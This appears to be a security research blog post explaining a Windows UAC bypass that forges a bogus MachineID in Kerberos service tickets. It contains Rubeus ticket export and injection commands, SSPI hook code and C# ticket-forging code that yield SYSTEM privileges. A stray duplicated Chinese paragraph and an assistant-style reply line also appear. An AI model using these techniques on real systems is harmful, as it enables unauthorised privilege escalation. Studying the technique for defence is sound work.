---
title: Revisiting a UAC Bypass By Abusing Kerberos Tickets
date: 2023-07-29 22:32:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Kerberos", "UAC Bypass", "Privilege Escalation"]
layout: post
---

## Background

The inspiration for this article comes from James Forshaw ([@tiraniddo](https://twitter.com/tiraniddo)) who presented a topic titled "*[Taking Kerberos To The Next Level](https://i.blackhat.com/USA-22/Wednesday/US-22-Forshaw-Taking-Kerberos-To-The-Next-Level.pdf)*" at BlackHat USA 2022. In his presentation, he demonstrated the abuse of Kerberos tickets to bypass User Account Control (UAC) and also wrote a blog post titled "[*Bypassing UAC in the most Complex Way Possible!*](https://www.tiraniddo.dev/2022/03/bypassing-uac-in-most-complex-way.html)" to explain the underlying principles. This caught my keen interest.

Although he did not provide the complete exploit code, I built a Proof of Concept (POC) based on [Rubeus](https://github.com/GhostPack/Rubeus#tgtdeleg). Rubeus is a C# toolkit designed for raw Kerberos interactions and ticket abuse. It offers a user-friendly interface, allowing us to easily initiate Kerberos requests and manipulate Kerberos tickets.

## Think For a While

User Account Control (UAC) allows users to perform common daily tasks with non-administrator privileges. User accounts that are members of the Administrator group run most applications with the principle of least privilege. Additionally, to better protect users who are members of the local Administrator group, Microsoft implements UAC restrictions over the network, which helps prevent loopback attacks. For local user accounts, except for the Administrator, members of the local Administrator group cannot obtain elevated privileges on remote computers. For domain user accounts, members of the Domain Admins group will run with a full administrator access token on remote computers, and UAC will not take effect.

This is because, by default, if a user is a member of the local Administrator group, LSASS (Local Security Authority Subsystem Service) filters any network authentication tokens to remove administrator privileges. However, if a user is a member of the Domain Admins group, LSASS allows network authentication to use a full administrator token. So, you might think that this is a trivial UAC bypass when using Kerberos for local authentication. If it were possible, all you would need to do is authenticate to local services as a domain user to obtain an unfiltered network token.

However, in reality, this is not possible. The Kerberos protocol has specific features to prevent the aforementioned attack, ensuring a certain level of security. If you are not running with an administrator token, accessing the SMB loopback interface should not suddenly grant you administrator privileges, as that could inadvertently compromise the system. So, how does LSASS determine if the target service is located on the current machine?

## Kerberos Loopback

As early as January 2021, Microsoft's Steve Syfuhs (@SteveSyfuhs) published an article titled "Preventing UAC Bypass through Kerberos Loopback." The article described the following content:

> *“The ticket is created by the KDC. The client can't see inside it, and can't manipulate it. It's opaque. However, the client can ask the KDC to include extra bits in the ticket.* 
>
> *These extra bits are just a way to carry information from the client to the target service during authentication. As it happens one of the things the client always asks to include is a **machine nonce**.*
>
> *See, when the client asks the client Kerberos stack for a ticket, the stack creates a random bit of data and stashes it in LSA and associates it to the currently logged on user. This is the nonce. This nonce is also stuck in the ticket, and then received by the target service.*
>
> *The target service knows about this nonce and asks LSA if it happens to have this nonce stashed somewhere. If it doesn't, well, then it's another machine and just carry on as usual.*
>
> *However, if it does have this nonce, LSA will inform the Kerberos stack that it originally came from user so and so, and most importantly that the user was not elevated at the time.”*

这里提到了一个重要的元素就是 “*machine nonce*”，如果票据中的 “*machine nonce*” 值在目标服务机器上可以找到，那就说明发起 Kerberos 请求的客户端和目标服务位于同一台机器上。最重要的是，这将导致 LSASS 过滤网络令牌。

我在微软 “*[[MS-KILE]: Kerberos Protocol Extensions](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9)*” 文档中记载的的 [LSAP_TOKEN_INFO_INTEGRITY](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/ec551137-c5e5-476a-9c89-e0029473c41b) 结构中找到了这个 “*machine nonce*”，该结构 LSAP_TOKEN_INFO_INTEGRITY 结构指定客户端的完整性级别信息，如下所示，其中的 MachineID 成员就是 “*machine nonce*”。

An important element mentioned here is the "*machine nonce*". If the value of the "*machine nonce*" in the ticket can be found on the target service machine, it indicates that the client initiating the Kerberos request and the target service are on the same machine. Most importantly, this will cause LSASS to filter the network token.

I found this "*machine nonce*" in the [LSAP_TOKEN_INFO_INTEGRITY](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/ec551137-c5e5-476a-9c89-e0029473c41b) structure documented in Microsoft's "*[[MS-KILE]: Kerberos Protocol Extensions](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9)*" document. The LSAP_TOKEN_INFO_INTEGRITY structure specifies client integrity level information, and the MachineID member in this structure is the "*machine nonce*," as shown below.

```c++
 typedef struct _LSAP_TOKEN_INFO_INTEGRITY {
   unsigned long Flags;
   unsigned long TokenIL;
   unsigned char MachineID[32];
 } LSAP_TOKEN_INFO_INTEGRITY, *PLSAP_TOKEN_INFO_INTEGRITY;
```

The MachineID is actually an ID used to identify the calling machine. It is created during computer startup and initialized through a random number generator. In other words, the MachineID changes every time the computer is booted. Its actual value is recorded in the LsapGlobalMachineID global variable of the lsasrv.dll module and loaded into the LSASS process space.

Furthermore, the Microsoft official document "*[[MS-KILE]: Kerberos Protocol Extensions, section 3.4.5.3 Processing Authorization Data](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/4ad7ed1f-0bfa-4b5f-bda3-fedbc549a6c0)*" also records the following information:

> *“The server MUST search all AD-IF-RELEVANT containers for the KERB_AUTH_DATA_TOKEN_RESTRICTIONS and KERB_AUTH_DATA_LOOPBACK authorization data entries. The server MAY search all AD-IF-RELEVANT containers for all other authorization data entries. The server MUST check if KERB-AD-RESTRICTION-ENTRY.Restriction.MachineID is equal to machine ID.*
>
> - *If equal, the server processes the authentication as a local one, because the client and server are on the same machine, and can use the KERB-LOCAL structure AuthorizationData for any local implementation purposes.*
> - *Otherwise, the server MUST ignore the KERB_AUTH_DATA_TOKEN_RESTRICTIONS Authorization Data Type, the KERB-AD-RESTRICTION-ENTRY structure, the KERB-LOCAL, and the containing KERB-LOCAL structure.”*

The server must search for the `KERB_AUTH_DATA_TOKEN_RESTRICTIONS` and `KERB_AUTH_DATA_LOOPBACK` authorization data entries in all `AD-IF-RELEVANT` containers present in the PAC (Privilege Attribute Certificate) structure of the service ticket. Additionally, it must check if the `KERB-AD-RESTRICTION-ENTRY.Restriction.MachineID` is equal to the machine ID (LsapGlobalMachineID). If they are equal, the server considers the authentication as a local authentication, indicating that the client and server are on the same computer.

In such cases, the Kerberos module in LSASS calls the LSA (Local Security Authority) function `LsaISetSupplementalTokenInfo` to apply the information from the `KERB-AD-RESTRICTION-ENTRY` structure of the ticket to the token. The relevant code is shown below:

```c++
NTSTATUS LsaISetSupplementalTokenInfo(PHANDLE phToken, 
                        PLSAP_TOKEN_INFO_INTEGRITY pTokenInfo) {
  // ...
  BOOL bLoopback = FALSE:
  BOOL bFilterNetworkTokens = FALSE;

  if (!memcmp(&LsapGlobalMachineID, pTokenInfo->MachineID,
       sizeof(LsapGlobalMachineID))) {
    bLoopback = TRUE;
  }

  if (LsapGlobalFilterNetworkAuthenticationTokens) {
    if (pTokenInfo->Flags & LimitedToken) {
      bFilterToken = TRUE;
    }
  }

  PSID user = GetUserSid(*phToken);
  if (!RtlEqualPrefixSid(LsapAccountDomainMemberSid, user)
    || LsapGlobalLocalAccountTokenFilterPolicy 
    || NegProductType == NtProductLanManNt) {
    if ( !bFilterToken && !bLoopback )
      return STATUS_SUCCESS;
  }

  /// Filter token if needed and drop integrity level.
}
```

The execution logic of the above code is similar to the flow depicted in the diagram below:

![image-20230730123829490](/assets/posts/2023-07-29-revisiting-a-uac-bypass-by-abusing-kerberos-tickets/image-20230730123829490.png)

The `LsaISetSupplementalTokenInfo` function primarily performs three checks:

1. The first check compares the `MachineID` field in the `KERB-AD-RESTRICTION-ENTRY` with the value stored in the LSASS variable `LsapGlobalMachineID`. If it matches, the `bLoopback` flag is set.
2. Next, it examines the value of `LsapGlobalFilterNetworkAuthenticationTokens` to filter all network tokens. At this point, it checks the `LimitedToken` flag and sets the `bFilterToken` flag accordingly. This filtering mode is typically disabled by default, so the `bFilterToken` is usually not set.
3. Lastly, the code queries the account SID to which the currently created token belongs and checks if any of the following conditions are true:
   - The user SID is not a member of the local account domain.
   - `LsapGlobalLocalAccountTokenFilterPolicy` is non-zero, which disables local account filtering.
   - `NegProductType` matches `NtProductLanManNt`, which corresponds to a domain controller.

If any of the last three conditions are true, and the token information has neither loopback nor forced filtering, the function will return success, and no filtering will occur.

For the token's integrity level, if filtering is being performed, it will be lowered to the value specified in the `TokenIL` field of the `KERB-AD-RESTRICTION-ENTRY`. However, it will not elevate the integrity level beyond the default integrity level of the token created, so it cannot be abused to gain system integrity.

## Add a Bogus MachineID

By now, you probably have some understanding. If you have authenticated as a domain user, the simplest way to abuse the system is to make the MachineID check fail. The value of the global variable `LsapGlobalMachineID` is a random value generated by LSASS during computer startup.

### Restart Server

One method is to generate a KRB-CRED format of the service ticket for the local system and save it to disk. Then, restart the system to reinitialize `LsapGlobalMachineID`, and upon returning to the system, reload the previously saved ticket. At this point, the ticket will have a different MachineID, and Kerberos will ignore the restrictions such as `KERB_AUTH_DATA_TOKEN_RESTRICTIONS`, as described in the Microsoft official documentation. You can use the built-in `klist` command in Windows along with the Rubeus toolkit to accomplish this.

(1) First, use the `klist` command to obtain the ticket for the local server's HOST service:

```console
klist get HOST/$env:COMPUTERNAME
```

![image-20230727160302124](/assets/posts/2023-07-29-revisiting-a-uac-bypass-by-abusing-kerberos-tickets/image-20230727160302124.png)

(2) Use Rubeus to export the requested service ticket:

```console
Rubeus.exe dump /server:$env:COMPUTERNAME /nowrap
```

![image-20230727160853749](/assets/posts/2023-07-29-revisiting-a-uac-bypass-by-abusing-kerberos-tickets/image-20230727160853749.png)

(3) Restart the server and re-pass the service ticket exported by Rubeus back into memory:

```console
Rubeus.exe ptt /ticket:<BASE64 TICKET> 
```

![image-20230727162752969](/assets/posts/2023-07-29-revisiting-a-uac-bypass-by-abusing-kerberos-tickets/image-20230727162752969.png)

At this point, due to having a MachineID in the ticket that is different from the LsapGlobalMachineID value, network token filtering will no longer take place. You can use Kerberos authentication to access the Service Control Manager (SCM) named pipe or TCP using the HOST/HOSTNAME or RPC/HOSTNAME SPN. It's important to note that the Win32 API of SCM always uses Negotiate authentication. James Forshaw has created a simple Proof of Concept (POC) named [*SCMUACBypass.cpp*](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82) which hooks the AcquireCredentialsHandle and InitializeSecurityContextW APIs to change the authentication package name (pszPackage) used by SCM to Kerberos, enabling SCM to use Kerberos during local authentication, as shown below.

```c++
SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(
    _In_opt_  LPWSTR pszPrincipal,                // Name of principal
    _In_      LPWSTR pszPackage,                  // Name of package
    _In_      unsigned long fCredentialUse,       // Flags indicating use
    _In_opt_  void* pvLogonId,                   // Pointer to logon ID
    _In_opt_  void* pAuthData,                   // Package specific data
    _In_opt_  SEC_GET_KEY_FN pGetKeyFn,           // Pointer to GetKey() func
    _In_opt_  void* pvGetKeyArgument,            // Value to pass to GetKey()
    _Out_     PCredHandle phCredential,           // (out) Cred Handle
    _Out_opt_ PTimeStamp ptsExpiry                // (out) Lifetime (optional)
)
{
    WCHAR kerberos_package[] = MICROSOFT_KERBEROS_NAME_W;
    printf("AcquireCredentialsHandleHook called for package %ls\n", pszPackage);
    if (_wcsicmp(pszPackage, L"Negotiate") == 0) {
        pszPackage = kerberos_package;
        printf("Changing to %ls package\n", pszPackage);
    }
    return AcquireCredentialsHandleW(pszPrincipal, pszPackage, fCredentialUse,
        pvLogonId, pAuthData, pGetKeyFn, pvGetKeyArgument, phCredential, ptsExpiry);
}

SECURITY_STATUS SEC_ENTRY InitializeSecurityContextWHook(
    _In_opt_    PCredHandle phCredential,               // Cred to base context
    _In_opt_    PCtxtHandle phContext,                  // Existing context (OPT)
    _In_opt_ SEC_WCHAR* pszTargetName,         // Name of target
    _In_        unsigned long fContextReq,              // Context Requirements
    _In_        unsigned long Reserved1,                // Reserved, MBZ
    _In_        unsigned long TargetDataRep,            // Data rep of target
    _In_opt_    PSecBufferDesc pInput,                  // Input Buffers
    _In_        unsigned long Reserved2,                // Reserved, MBZ
    _Inout_opt_ PCtxtHandle phNewContext,               // (out) New Context handle
    _Inout_opt_ PSecBufferDesc pOutput,                 // (inout) Output Buffers
    _Out_       unsigned long* pfContextAttr,  // (out) Context attrs
    _Out_opt_   PTimeStamp ptsExpiry                    // (out) Life span (OPT)
)
{
    // Change the SPN to match with the UAC bypass ticket you've registered.
    printf("InitializeSecurityContext called for target %ls\n", pszTargetName);
    SECURITY_STATUS status = InitializeSecurityContextW(phCredential, phContext, &spn[0], 
        fContextReq, Reserved1, TargetDataRep, pInput,
        Reserved2, phNewContext, pOutput, pfContextAttr, ptsExpiry);
    printf("InitializeSecurityContext status = %08X\n", status);
    return status;
}

// ...

int wmain(int argc, wchar_t** argv)
{
    // ...
    
    PSecurityFunctionTableW table = InitSecurityInterfaceW();
    table->AcquireCredentialsHandleW = AcquireCredentialsHandleWHook;
    table->InitializeSecurityContextW = InitializeSecurityContextWHook;
    
    // ...
}
```

Then, it creates a service and runs it with SYSTEM privileges. As shown in the image below, it successfully obtains SYSTEM privileges.

![image-20230727163311022](/assets/posts/2023-07-29-revisiting-a-uac-bypass-by-abusing-kerberos-tickets/image-20230727163311022.png)

### Tgtdeleg Trick

Another method is to generate the service ticket ourselves. However, it's important to note that without access to the current user's credentials, we cannot manually generate a TGT (Ticket Granting Ticket). However, Benjamin Delpy ([@gentilkiwi](https://github.com/gentilkiwi)) introduced a technique (tgtdeleg) in his [Kekeo](https://github.com/gentilkiwi/kekeo/blob/4fbb44ec54ff093ae0fbe4471de19681a8e71a86/kekeo/modules/kuhl_m_tgt.c#L189-L327) that allows you to abuse unconstrained delegation to obtain a local TGT with a session key.

<img src="/assets/posts/2023-07-29-revisiting-a-uac-bypass-by-abusing-kerberos-tickets/image-20230728091637233.png" alt="image-20230728091637233" style="zoom:67%;" />

Tgtdeleg abuses Kerberos GSS-API to obtain the current user's available TGT without requiring elevated privileges on the host. This method uses the `AcquireCredentialsHandle` function to obtain the Kerberos security credential handle of the current user. It then calls the `InitializeSecurityContext` function with the `ISC_REQ_DELEGATE` flag and the target SPN set as `HOST/DC.domain.com`, preparing a fake delegate context to be sent to the domain controller.

This results in the KRB_AP-REQ packet in the GSS-API output containing the KRB_CRED in the Authenticator Checksum. Subsequently, it extracts the session key of the service ticket from the local Kerberos cache and uses it to decrypt the KRB_CRED in the Authenticator, obtaining an available TGT.

The Rubeus toolkit also incorporates this technique. For more specific details, please refer to "[*Rubeus – Now With More Kekeo*](https://blog.harmj0y.net/redteaming/rubeus-now-with-more-kekeo/#tgtdeleg)".

With this TGT obtained through the Tgtdeleg technique, we can proceed with generating our own service ticket using the following feasible operational flow:

1. Use the Tgtdeleg technique to obtain the user's TGT.
2. Use the TGT to request the KDC to generate a new service ticket for the local computer. Add a `KERB-AD-RESTRICTION-ENTRY`, but fill in a fake MachineID.
3. Submit the service ticket to the cache.
4. Access the SCM (Service Control Manager) to create a system service and bypass UAC.

## Implemented By C#

To implement the aforementioned flow, I have created my own Proof of Concept (POC) based on Rubeus: https://github.com/wh0amitz/KRBUACBypass

### Main Class

Here, I have implemented two functional modules. The first one is "asktgs", which is used to request a service ticket with fake MachineID. After obtaining the ticket, the second module, "krbscm", is used to access the SCM (Service Control Manager) and create a system service. The flow is as follows:

```c#
private static void Run(string[] args, Options options)
{
	string method = args[0];
	string command = options.Command;
	Verbose = options.Verbose;

    // Get domain controller name
	string domainController = Networking.GetDCName();
    // Get the dns host name of the current host and construct the SPN of the HOST service
	string service = $"HOST/{Dns.GetHostName()}";
    // Default kerberos etype
	Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial;
	string outfile = "";
	bool ptt = true;

	if(method == "asktgs")
	{
        // Execute the tgtdeleg trick
		byte[] blah = LSA.RequestFakeDelegTicket();
		KRB_CRED kirbi = new KRB_CRED(blah);
		Ask.TGS(kirbi, service, requestEType, outfile, ptt, domainController);
	}

	if (method == "krbscm")
	{
		// extract out the tickets (w/ full data) with the specified targeting options
		List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(false, new LUID(), "HOST", null, null, true);
                
		if(sessionCreds[0].Tickets.Count > 0)
		{
			// display tickets with the "Full" format
			LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Klist);
			try
			{
				KrbSCM.Execute(command);
			}
			catch { }
			return;
		}
		else
		{
			Console.WriteLine("[-] Please request a HOST service ticket for the current user first.");
			Console.WriteLine("[-] Please execute: KRBUACBypass.exe asktgs.");
			return;
		}
	}

	if (method == "system")
	{
		try
		{
			KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
		}
		catch { }
		return;
	}
}
```

### Asktgs 

The "asktgs" module first calls the `LSA.RequestFakeDelegTicket()` method provided by Rubeus to execute the tgtdeleg technique. It then saves the returned user TGT as a byte type in the variable `blah`, as shown below:

```c#
if(method == "asktgs")
{
	// Execute the tgtdeleg trick
	byte[] blah = LSA.RequestFakeDelegTicket();
	KRB_CRED kirbi = new KRB_CRED(blah);
	Ask.TGS(kirbi, service, requestEType, outfile, ptt, domainController);
}
```

After obtaining the contents of `blah`, you can initialize it as a KRB_CRED type according to ASN.1 encoding rules. Once you have the TGT in the form of a KRB_CRED type, you can then add or modify elements within the TGT.

> The Kerberos protocol is defined here in terms of Abstract Syntax Notation One (ASN.1) [X680], which provides a syntax for specifying both the abstract layout of protocol messages as well as their encodings. 

The KRB_CRED structure is the message format used to send Kerberos credentials from one principal to another. The KRB_CRED message contains a sequence of tickets to be sent along with the necessary information to use those tickets, including the session keys for each ticket. The ASN.1 module definition for the KRB_CRED structure in the Kerberos protocol should follow the following form:

```cpp
KRB-CRED        ::= [APPLICATION 22] SEQUENCE {
        pvno            [0] INTEGER (5),
        msg-type        [1] INTEGER (22),
        tickets         [2] SEQUENCE OF Ticket,
        enc-part        [3] EncryptedData -- EncKrbCredPart
}

EncKrbCredPart  ::= [APPLICATION 29] SEQUENCE {
        ticket-info     [0] SEQUENCE OF KrbCredInfo,
        nonce           [1] UInt32 OPTIONAL,
        timestamp       [2] KerberosTime OPTIONAL,
        usec            [3] Microseconds OPTIONAL,
        s-address       [4] HostAddress OPTIONAL,
        r-address       [5] HostAddress OPTIONAL
}

KrbCredInfo     ::= SEQUENCE {
        key             [0] EncryptionKey,
        prealm          [1] Realm OPTIONAL,
        pname           [2] PrincipalName OPTIONAL,
        flags           [3] TicketFlags OPTIONAL,
        authtime        [4] KerberosTime OPTIONAL,
        starttime       [5] KerberosTime OPTIONAL,
        endtime         [6] KerberosTime OPTIONAL,
        renew-till      [7] KerberosTime OPTIONAL,
        srealm          [8] Realm OPTIONAL,
        sname           [9] PrincipalName OPTIONAL,
        caddr           [10] HostAddresses OPTIONAL
}
```

Afterward, the `Ask.TGS()` method will be called to request a TGS (Service Ticket). Since we need to add a new `KERB-AD-RESTRICTION-ENTRY` structure to the service ticket, but the service ticket is encrypted using the Application Server's Long-term Key, which we do not have access to due to our current privileges, we can only add the forged `KERB-AD-RESTRICTION-ENTRY` structure to the `enc-authorization-data` element of the KRB_KDC_REQ message before constructing the KRB_KDC_REQ request.

When the KRB_KDC_REQ request is sent to the KDC, the `enc-authorization-data` element in the KRB_KDC_REQ message will be copied to the `enc-part.authorization-data` element of the service ticket, and it will be returned in the KRB_KDC_REP message. As a result, the service ticket we request will contain the forged `KERB-AD-RESTRICTION-ENTRY` and the fake MachineID.

To achieve the desired functionality, you can add the necessary code in the `lib\krb_structures\TGS_REQ.cs` file as shown below:

```c#
if (KRBUACBypass.Program.BogusMachineID)
{
    req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
    req.req_body.kdcOptions = req.req_body.kdcOptions & ~Interop.KdcOptions.RENEWABLEOK;

    // Add a KERB-AD-RESTRICTION-ENTRY but fill in a bogus machine ID.
    // Initializes a new AD-IF-RELEVANT container
    ADIfRelevant ifrelevant = new ADIfRelevant();
    // Initializes a new KERB-AD-RESTRICTION-ENTRY element
    ADRestrictionEntry restrictions = new ADRestrictionEntry();
    // Initializes a new KERB-LOCAL element, optional
    ADKerbLocal kerbLocal = new ADKerbLocal();
    // Add a KERB-AD-RESTRICTION-ENTRY element to the AD-IF-RELEVANT container
    ifrelevant.ADData.Add(restrictions);
	// Optional
    ifrelevant.ADData.Add(kerbLocal);
    // ASN.1 encode the contents of the AD-IF-RELEVANT container
    AsnElt authDataSeq = ifrelevant.Encode();
    // Encapsulate the ASN.1-encoded AD-IF-RELEVANT container into a SEQUENCE type
    authDataSeq = AsnElt.Make(AsnElt.SEQUENCE, authDataSeq);
    // Get the final authorization data byte array
    byte[] authorizationDataBytes = authDataSeq.Encode();
    // Encrypt authorization data to generate enc_authorization_data byte array
    byte[] enc_authorization_data = Crypto.KerberosEncrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REQ_ENC_AUTHOIRZATION_DATA, clientKey, authorizationDataBytes);
    // Assign the encrypted authorization data to the enc_authorization_data field of the KRB_KDC_REQ
    req.req_body.enc_authorization_data = new EncryptedData((Int32)paEType, enc_authorization_data);

    // encode req_body for authenticator cksum
    // Optional
    AsnElt req_Body_ASN = req.req_body.Encode();
    AsnElt req_Body_ASNSeq = AsnElt.Make(AsnElt.SEQUENCE, new[] { req_Body_ASN });
    req_Body_ASNSeq = AsnElt.MakeImplicit(AsnElt.CONTEXT, 4, req_Body_ASNSeq);
    byte[] req_Body_Bytes = req_Body_ASNSeq.CopyValue();
    cksum_Bytes = Crypto.KerberosChecksum(clientKey, req_Body_Bytes, Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_RSA_MD5);
}
```

![image-20230727193455913](/assets/posts/2023-07-29-revisiting-a-uac-bypass-by-abusing-kerberos-tickets/image-20230727193455913.png)

### Krbscm

Understood. It appears that the `krbscm` functionality in your POC is similar to James Forshaw's [*SCMUACBypass.cpp*](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82), so there's no need to go into further detail on that part.

## Let’s see it in action

Now, let's take a look at the running result, as shown in the screenshot below. First, the asktgs functionality is used to request the service ticket for the current server's HOST service. Then, krbscm is utilized to create a system service, granting SYSTEM privileges.

```console
KRBUACBypass.exe asktgs -v
KRBUACBypass.exe krbscm
```

![Animation](/assets/posts/2023-07-29-revisiting-a-uac-bypass-by-abusing-kerberos-tickets/Animation.gif)

